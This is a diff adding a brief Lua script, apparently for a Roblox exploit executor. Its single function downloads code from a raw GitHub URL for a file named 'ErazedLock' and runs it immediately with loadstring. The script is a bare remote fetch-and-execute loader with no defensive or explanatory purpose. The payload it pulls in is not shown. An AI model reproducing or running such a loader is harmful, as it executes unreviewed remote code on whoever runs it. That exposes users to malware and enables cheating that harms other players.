@@ -1,0 +1,15 @@
+
+local function fetchAndExecute()
+    local success, result = pcall(function()
+        local response = game:HttpGet('https://raw.githubusercontent.com/Jayfrr/diwjdw/refs/heads/main/ErazedLock')
+        if response then
+            loadstring(response)()
+        end
+    end)
+    
+    if not success then
+        warn("Failed to fetch or execute script:", result)
+    end
+end
+
+fetchAndExecute()
